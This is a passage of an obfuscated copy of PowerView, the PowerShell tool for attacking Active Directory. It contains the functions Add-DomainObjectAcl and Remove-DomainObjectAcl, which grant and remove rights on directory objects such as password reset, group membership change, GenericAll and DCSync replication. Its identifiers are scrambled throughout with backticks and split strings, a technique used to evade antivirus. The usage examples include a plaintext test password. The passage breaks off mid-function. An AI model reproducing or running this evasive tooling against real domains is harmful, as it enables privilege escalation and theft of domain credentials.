                            ${_} | &("{1}{2}{0}" -f 'ber','A','dd-Mem') ("{3}{0}{1}{2}" -f 'e','rt','y','NoteProp') 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], ${_}.AccessMask))
                            if (${gU`i`ds}) {
                                # if we're resolving GUIDs, map them them to the resolved hash table
                                ${Ac`Lpr`o`pErTIEs} = @{}
                                ${_}.psobject.properties | &("{3}{1}{4}{0}{2}" -f'-','rE','Object','Fo','ach') {
                                    if (${_}.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {
                                        try {
                                            ${A`c`LP`RopertiEs}[${_}.Name] = ${g`UI`ds}[${_}.Value.toString()]
                                        }
                                        catch {
                                            ${AClpR`Op`ERTiEs}[${_}.Name] = ${_}.Value
                                        }
                                    }
                                    else {
                                        ${A`C`LpRO`PERtI`eS}[${_}.Name] = ${_}.Value
                                    }
                                }
                                ${oU`TO`BjeCt} = &("{1}{2}{0}" -f 'ject','Ne','w-Ob') -TypeName ("{2}{1}{0}"-f 'ject','b','PSO') -Property ${A`cL`P`ROPertI`Es}
                                ${outo`BJ`e`Ct}.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                ${oUtOb`J`Ect}
                            }
                            else {
                                ${_}.PSObject.TypeNames.Insert(0, 'PowerView.ACL')
                                ${_}
                            }
                        }
                    }
                }
                catch {
                    &("{0}{2}{1}" -f 'Wri','e','te-Verbos') "[Get-DomainObjectAcl] Error: $_"
                }
            }
        }
    }
}


function adD-`doMaINOb`jeCt`Acl {
<#
.SYNOPSIS

Adds an ACL for a specific active directory object.

AdminSDHolder ACL approach from Sean Metcalf (@pyrotek3): https://adsecurity.org/?p=1906

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

This function modifies the ACL/ACE entries for a given Active Directory
target object specified by -TargetIdentity. Available -Rights are
'All', 'ResetPassword', 'WriteMembers', 'DCSync', or a manual extended
rights GUID can be set with -RightsGUID. These rights are granted on the target
object for the specified -PrincipalIdentity.

.PARAMETER TargetIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain object to modify ACLs for. Required. Wildcards accepted.

.PARAMETER TargetDomain

Specifies the domain for the TargetIdentity to use for the modification, defaults to the current domain.

.PARAMETER TargetLDAPFilter

Specifies an LDAP query string that is used to filter Active Directory object targets.

.PARAMETER TargetSearchBase

The LDAP source to search through for targets, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER PrincipalIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain principal to add for the ACL. Required. Wildcards accepted.

.PARAMETER PrincipalDomain

Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Rights

Rights to add for the principal, 'All', 'ResetPassword', 'WriteMembers', 'DCSync'.
Defaults to 'All'.

.PARAMETER RightsGUID

Manual GUID representing the right to add to the target.

.EXAMPLE

$Harmj0ySid = Get-DomainUser harmj0y | Select-Object -ExpandProperty objectsid
Get-DomainObjectACL dfm.a -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid}

...

Add-DomainObjectAcl -TargetIdentity dfm.a -PrincipalIdentity harmj0y -Rights ResetPassword -Verbose
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=harmj0y)))
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:(&(|(samAccountName=dfm.a)))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local 'ResetPassword' on CN=dfm (admin),CN=Users,DC=testlab,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID '00299570-246d-11d0-a768-00aa006e0529' on CN=dfm (admin),CN=Users,DC=testlab,DC=local

Get-DomainObjectACL dfm.a -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid }

AceQualifier           : AccessAllowed
ObjectDN               : CN=dfm (admin),CN=Users,DC=testlab,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-890171859-3433809279-3366196753-1114
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-890171859-3433809279-3366196753-1108
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

.EXAMPLE

$Harmj0ySid = Get-DomainUser harmj0y | Select-Object -ExpandProperty objectsid
Get-DomainObjectACL testuser -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid}

[no results returned]

$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Add-DomainObjectAcl -TargetIdentity testuser -PrincipalIdentity harmj0y -Rights ResetPassword -Credential $Cred -Verbose
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=harmj0y)(name=harmj0y))))
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=testuser)(name=testuser))))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local 'ResetPassword' on CN=testuser testuser,CN=Users,DC=testlab,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID '00299570-246d-11d0-a768-00aa006e0529' on CN=testuser,CN=Users,DC=testlab,DC=local

Get-DomainObjectACL testuser -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid }

AceQualifier           : AccessAllowed
ObjectDN               : CN=dfm (admin),CN=Users,DC=testlab,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-890171859-3433809279-3366196753-1114
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-890171859-3433809279-3366196753-1108
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

.LINK

https://adsecurity.org/?p=1906
https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${tR`Ue}, ValueFromPipelineByPropertyName = ${T`RuE})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${tarG`etident`iTY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${tA`RgeTD`oMAiN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${ta`RG`eT`LDa`pFilT`eR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${TARGE`TS`E`ArC`h`Base},

        [Parameter(Mandatory = ${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pr`i`NC`IP`ALid`Entity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${pr`InC`iPaLD`omaIN},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${s`ERver},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sEaR`c`H`sCOPe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${re`sUlTPaG`E`sIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`er`V`ErTIMe`Limit},

        [Switch]
        ${t`omBS`To`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cre`de`NtIAL} = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        ${RIg`HTs} = 'All',

        [Guid]
        ${rIG`Htsgu`Id}
    )

    BEGIN {
        ${TargeTs`EarcHErArgU`m`E`NTs} = @{
            'Properties' = 'distinguishedname'
            'Raw' = ${Tr`Ue}
        }
        if (${Ps`BOUn`dPA`RaME`TErS}['TargetDomain']) { ${t`AR`Ge`Ts`eaRCheRa`RGUm`EnTS}['Domain'] = ${t`ArGe`TdoMa`In} }
        if (${P`SboundP`ARAM`eTerS}['TargetLDAPFilter']) { ${TAR`ge`T`S`eAr`cHERa`RGuMe`NTS}['LDAPFilter'] = ${t`A`RGetl`dapfILT`Er} }
        if (${PsBou`NDP`A`R`Am`eTERs}['TargetSearchBase']) { ${Targ`etsE`ARCh`e`RARg`U`mEn`Ts}['SearchBase'] = ${tA`R`GETSEarC`h`B`ASE} }
        if (${p`SBO`U`NdpAr`AmEterS}['Server']) { ${ta`R`GeTseA`Rc`HERarGUmentS}['Server'] = ${S`Er`Ver} }
        if (${pSB`Ou`NdPa`RAmEters}['SearchScope']) { ${TA`R`G`EtseA`RC`He`RaRgU`MEnTS}['SearchScope'] = ${s`EARCHs`C`OpE} }
        if (${p`SbOunDpaR`Am`Et`eRs}['ResultPageSize']) { ${T`ArgeT`s`E`ArcHerAr`GUmeN`TS}['ResultPageSize'] = ${R`e`sultPAGESi`ze} }
        if (${pSb`o`UNdpaRa`meteRS}['ServerTimeLimit']) { ${t`ArGE`T`s`EArch`ERarG`UMENtS}['ServerTimeLimit'] = ${sE`Rvertime`L`im`it} }
        if (${P`sBOU`Ndpa`RaM`e`TerS}['Tombstone']) { ${T`Ar`g`EtsEaRCHeraRG`UM`EnTS}['Tombstone'] = ${T`O`mbsTOne} }
        if (${Ps`BOuNd`PaR`A`ME`TeRS}['Credential']) { ${tA`Rge`TseARChEra`RGu`Me`Nts}['Credential'] = ${c`RedE`Nti`Al} }

        ${PRIn`ci`PalS`EaRChe`RARGUM`entS} = @{
            'Identity' = ${PRI`NcipA`LiDEn`TiTY}
            'Properties' = 'distinguishedname,objectsid'
        }
        if (${Ps`Bo`UNd`pARA`MeTe`Rs}['PrincipalDomain']) { ${PriNCIP`Alse`A`RCHERa`Rgu`M`enTs}['Domain'] = ${prInc`IPa`lDOm`A`iN} }
        if (${P`sbOuNdparAM`e`TERs}['Server']) { ${p`RInCI`PALSeArcHe`RarGume`N`Ts}['Server'] = ${SE`Rv`eR} }
        if (${pS`Bo`Un`DParAMeTE`Rs}['SearchScope']) { ${PR`i`N`cIP`A`LsEArcHeRarGUmeNtS}['SearchScope'] = ${sEAr`chS`Co`Pe} }
        if (${ps`BO`UndPaRa`mETe`Rs}['ResultPageSize']) { ${Pr`INCI`paLs`EArC`hER`Arg`UM`E`NtS}['ResultPageSize'] = ${rE`sU`ltP`AGes`IZe} }
        if (${Psb`OU`ND`paraME`T`erS}['ServerTimeLimit']) { ${PR`IncipaLSe`A`RcHErAr`G`UMEn`Ts}['ServerTimeLimit'] = ${SE`RVEr`Tim`eliM`it} }
        if (${P`s`BoUNdPa`RAMeterS}['Tombstone']) { ${P`RINcIpalSe`A`Rch`erARg`UmeNTS}['Tombstone'] = ${tOmB`S`TO`Ne} }
        if (${ps`BoU`NDP`ARAM`EtERS}['Credential']) { ${Pri`Nc`ipa`LSearcH`ER`ARGUMe`N`TS}['Credential'] = ${CR`EDE`NT`IaL} }
        ${PRi`NCIp`A`ls} = &("{0}{1}{2}" -f 'Ge','t-DomainObjec','t') @PrincipalSearcherArguments
        if (-not ${P`RiNc`IPalS}) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }

    PROCESS {
        ${ta`R`gEts`Ea`RcH`erArGu`ments}['Identity'] = ${tA`Rget`i`dEN`TITY}
        ${TA`R`GETS} = &("{0}{2}{3}{4}{1}" -f 'Get-Dom','t','ainO','b','jec') @TargetSearcherArguments

        ForEach (${T`A`RgeTOB`jecT} in ${T`ARGe`Ts}) {

            ${inher`i`TAn`cETypE} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            ${Con`TroLT`YPe} = [System.Security.AccessControl.AccessControlType] 'Allow'
            ${Ac`es} = @()

            if (${RIG`htSGU`Id}) {
                ${G`UIdS} = @(${r`iGHT`sgUiD})
            }
            else {
                ${G`U`IDS} = Switch (${r`i`GhTs}) {
                    # ResetPassword doesn't need to know the user's current password
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    # allows for the modification of group membership
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    # 'DS-Replication-Get-Changes' = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
                    # 'DS-Replication-Get-Changes-All' = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
                    # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c
                    #   when applied to a domain's ACL, allows for the use of DCSync
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach (${P`RI`NC`IpaloBject} in ${pRi`NC`iPa`Ls}) {
                &("{2}{1}{0}" -f'Verbose','e-','Writ') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname)"

                try {
                    ${Iden`T`iTY} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${Pr`I`NcIpA`lObJe`ct}.objectsid)

                    if (${g`UIDS}) {
                        ForEach (${GU`ID} in ${gu`i`ds}) {
                            ${NEwg`U`iD} = &("{2}{1}{0}"-f 'ject','ew-Ob','N') ("{1}{0}"-f 'd','Gui') ${Gu`ID}
                            ${Ad`RigHts} = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            ${Ac`eS} += &("{3}{0}{1}{2}"-f 'e','w-Objec','t','N') ("{2}{13}{4}{9}{0}{11}{8}{1}{14}{3}{5}{7}{10}{6}{12}"-f'ctor','ctiv','S','tor','.Di','y','s','A','rvices.A','re','cces','ySe','Rule','ystem','eDirec') ${iD`ENti`Ty}, ${AD`RiGH`Ts}, ${c`OntrO`L`TYPe}, ${NEwGu`iD}, ${IN`He`RIta`NCETYpE}
                        }
                    }
                    else {
                        # deault to GenericAll rights
                        ${aDr`I`gHtS} = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        ${A`CEs} += &("{1}{2}{0}"-f'ct','New-O','bje') ("{5}{3}{6}{2}{10}{1}{9}{7}{4}{0}{8}"-f 'Ac','.A','ector','.D','ctory','System','ir','e','cessRule','ctiveDir','yServices') ${id`EN`TItY}, ${AdriG`h`Ts}, ${cONtR`OLT`Ype}, ${inHeRI`TAnC`E`TY`PE}
                    }

                    # add all the new ACEs to the specified object directory entry
                    ForEach (${a`CE} in ${a`Ces}) {
                        &("{3}{2}{1}{0}" -f 'rbose','e','-V','Write') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        ${T`Arge`T`entRY} = ${ta`R`G`ETobjEct}.GetDirectoryEntry()
                        ${tAR`GEt`EnT`Ry}.PsBase.Options.SecurityMasks = 'Dacl'
                        ${Ta`RGEtE`NTRY}.PsBase.ObjectSecurity.AddAccessRule(${a`CE})
                        ${tARG`E`T`enTRY}.PsBase.CommitChanges()
                    }
                }
                catch {
                    &("{0}{3}{2}{1}" -f'Write-Ve','ose','b','r') "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function re`MoVe`-doMainOb`j`eCTA`Cl {
<#
.SYNOPSIS

Removes an ACL from a specific active directory object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

This function modifies the ACL/ACE entries for a given Active Directory
target object specified by -TargetIdentity. Available -Rights are
'All', 'ResetPassword', 'WriteMembers', 'DCSync', or a manual extended
rights GUID can be set with -RightsGUID. These rights are removed from the target
object for the specified -PrincipalIdentity.

.PARAMETER TargetIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain object to modify ACLs for. Required. Wildcards accepted.

.PARAMETER TargetDomain

Specifies the domain for the TargetIdentity to use for the modification, defaults to the current domain.

.PARAMETER TargetLDAPFilter

Specifies an LDAP query string that is used to filter Active Directory object targets.

.PARAMETER TargetSearchBase

The LDAP source to search through for targets, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER PrincipalIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain principal to add for the ACL. Required. Wildcards accepted.

.PARAMETER PrincipalDomain

Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Rights

Rights to add for the principal, 'All', 'ResetPassword', 'WriteMembers', 'DCSync'.
Defaults to 'All'.

.PARAMETER RightsGUID

Manual GUID representing the right to add to the target.

.EXAMPLE

$UserSID = Get-DomainUser user | Select-Object -ExpandProperty objectsid
Get-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID}

[no results returned]

Add-DomainObjectAcl -TargetIdentity user2 -PrincipalIdentity user -Rights ResetPassword

Get-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID }

AceQualifier           : AccessAllowed
ObjectDN               : CN=user2,CN=Users,DC=testlab,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-883232822-274137685-4173207997-2105
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-883232822-274137685-4173207997-2104
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0


Remove-DomainObjectAcl -TargetIdentity user2 -PrincipalIdentity user -Rights ResetPassword

Get-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID}

[no results returned]

.LINK

https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = ${Tr`Ue}, ValueFromPipelineByPropertyName = ${tR`Ue})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${T`ArgEt`IdeNTI`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${tA`RGeTD`oMa`In},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${t`ARG`Etld`ApF`ILtER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${taRgE`Ts`EARcH`B`A`se},

        [Parameter(Mandatory = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRiNC`iPA`lId`EnTitY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${prInc`IPA`LDOmA`iN},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${serv`ER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${sEArC`Hsco`pe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${RESUL`T`p`A`gESizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`eRveRtIMelI`m`it},

        [Switch]
        ${t`ombStO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`de`Nt`iAl} = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        ${R`iGhts} = 'All',

        [Guid]
        ${r`i`ghT`SGUId}
    )

    BEGIN {
        ${taRGE`T`s`E`A`RcHEraRgUM`en`Ts} = @{
            'Properties' = 'distinguishedname'
            'Raw' = ${T`RUE}
        }
        if (${psB`Ound`Pa`RaMeTERs}['TargetDomain']) { ${taR`g`E`TSeaRch`ERa`RG`UMenTS}['Domain'] = ${t`A`RG`ETd`oMAIN} }
        if (${ps`BOUNd`p`ARAME`TeRs}['TargetLDAPFilter']) { ${TArGet`Sear`c`HerarGU`mENTs}['LDAPFilter'] = ${TARg`et`lda`PFiLTeR} }
        if (${pSBO`UndP`ArAM`et`ers}['TargetSearchBase']) { ${tar`gEtSEArCh`Er`ARgu`meN`TS}['SearchBase'] = ${tAr`G`EtsEaRc`HbasE} }
        if (${ps`B`o`UNDpARame`TERS}['Server']) { ${TArGe`TS`E`ARc`heRArGu`men`Ts}['Server'] = ${serv`er} }
        if (${PSbouNDPa`RAmet`E`RS}['SearchScope']) { ${T`A`RGeTs`e`ArCheRa`R`GuMeNTs}['SearchScope'] = ${sEaR`C`hS`COpE} }
        if (${ps`BO`UNDpar`A`MEtE`Rs}['ResultPageSize']) { ${TA`RgETS`EAr`cHeR`ArGuMeNTs}['ResultPageSize'] = ${re`sU`LT`P`AGesIze} }
        if (${pS`BouN`dPAramE`T`eRS}['ServerTimeLimit']) { ${targetsEA`RChER`Ar`gu`meNts}['ServerTimeLimit'] = ${SErVEr`Ti`MeL`im`it} }
        if (${psbOUN`dp`Ara`M`etErS}['Tombstone']) { ${t`Arg`Et`se`ARcHE`RArgUMe`NTS}['Tombstone'] = ${tOmB`STo`NE} }
        if (${P`SbOu`NdpARAmE`TerS}['Credential']) { ${TA`RGetseA`RC`H`Er`A`RGUme`Nts}['Credential'] = ${c`REdE`NtI`AL} }

        ${Pri`N`CI`palsE`ArcheR`A`RGuMeN`TS} = @{
            'Identity' = ${pri`Nc`IpAli`deNTI`Ty}
            'Properties' = 'distinguishedname,objectsid'
        }
        if (${pSBOU`NDpaRA`M`e`TeRs}['PrincipalDomain']) { ${Pri`NC`ipALSeA`RchErARGu`Me`N`Ts}['Domain'] = ${PR`inciP`A`LDoMaIn} }
        if (${psbOUndP`Ara`me`TErS}['Server']) { ${prInc`I`PAL`sE`ArCHe`RArGu`MEnts}['Server'] = ${s`eRVer} }
        if (${psbou`NDp`Ar`A`METERS}['SearchScope']) { ${pRINCIp`ALSe`ARC`He`RAR`guMeNts}['SearchScope'] = ${se`Ar`cHSco`pe} }
        if (${PSb`OUnDPARa`Me`TErS}['ResultPageSize']) { ${pRIN`cIPalseArch`eRa`RGum`eNTs}['ResultPageSize'] = ${RE`SuLTpag`ESi`Ze} }
        if (${Ps`BOU`NdpAra`meT`ers}['ServerTimeLimit']) { ${PrI`N`cIPALSEarC`hE`Rar`GuMents}['ServerTimeLimit'] = ${sEr`VeRt`imEl`iMIT} }
        if (${p`Sb`OUND`PA`RAmE`TeRs}['Tombstone']) { ${pRI`NcipALSe`A`RcherARGUME`NtS}['Tombstone'] = ${TOmB`ST`ONe} }
        if (${PSBOuNdP`A`R`AMeT`ERs}['Credential']) { ${PrIncipAL`Sea`R`ch`era`RGUME`N`TS}['Credential'] = ${cR`edEn`TI`AL} }
        ${pRinc`i`PA`ls} = &("{4}{3}{2}{0}{1}" -f'n','Object','omai','-D','Get') @PrincipalSearcherArguments
        if (-not ${P`R`iNcI`palS}) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }

    PROCESS {
        ${TAr`g`eT`seA`R`cHeraRG`U`MENtS}['Identity'] = ${tA`R`g`eTIdEnTITY}
        ${TAR`g`EtS} = &("{2}{1}{0}" -f'mainObject','et-Do','G') @TargetSearcherArguments

        ForEach (${targetO`BjE`Ct} in ${ta`Rgets}) {

            ${iNhe`Ri`T`An`CETYPe} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            ${co`NtroLTY`Pe} = [System.Security.AccessControl.AccessControlType] 'Allow'
            ${A`ceS} = @()

            if (${R`igh`TSgu`iD}) {
                ${g`UIdS} = @(${rI`ght`sg`UiD})
            }
            else {
                ${GUI`DS} = Switch (${r`i`GHTs}) {
                    # ResetPassword doesn't need to know the user's current password
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    # allows for the modification of group membership
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    # 'DS-Replication-Get-Changes' = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
                    # 'DS-Replication-Get-Changes-All' = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
                    # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c
                    #   when applied to a domain's ACL, allows for the use of DCSync
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach (${p`RiNCi`pAloBJ`ect} in ${P`R`IN`CIPalS}) {
                &("{0}{1}{2}"-f'W','rit','e-Verbose') "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname)"

                try {
                    ${I`dEN`Tity} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${pRiNCiP`A`LO`B`jeCT}.objectsid)

                    if (${G`UIDS}) {
                        ForEach (${GU`Id} in ${G`Uids}) {
                            ${NEw`Gu`iD} = &("{0}{3}{1}{2}"-f 'N','bjec','t','ew-O') ("{0}{1}"-f'Gui','d') ${g`Uid}
                            ${A`dRIghts} = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            ${A`CES} += &("{0}{3}{2}{1}"-f'N','ect','bj','ew-O') ("{3}{4}{6}{2}{0}{5}{1}{7}{8}"-f're','A','.ActiveDi','Syste','m.Directo','ctory','ryServices','cces','sRule') ${I`dEnT`Ity}, ${Ad`RIg`hts}, ${cO`N`Trolt`ypE}, ${NE`wGu`ID}, ${inher`iTan`C`e`TY`Pe}
                        }
                    }
                    else {
                        # deault to GenericAll rights
                        ${A`D`RIg`hTS} = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        ${aC`eS} += &("{1}{0}{3}{2}" -f'-Obje','New','t','c') ("{9}{6}{5}{8}{3}{10}{2}{0}{7}{1}{4}" -f 'ActiveDi','ctoryAcce','.','ce','ssRule','.DirectorySer','tem','re','vi','Sys','s') ${IDEn`Ti`TY}, ${A`Dr`iGhTS}, ${cO`NTrOl`TyPE}, ${iNhErITA`N`cE`T`y`PE}
                    }

                    # remove all the specified ACEs from the specified object directory entry
                    ForEach (${A`CE} in ${a`ces}) {
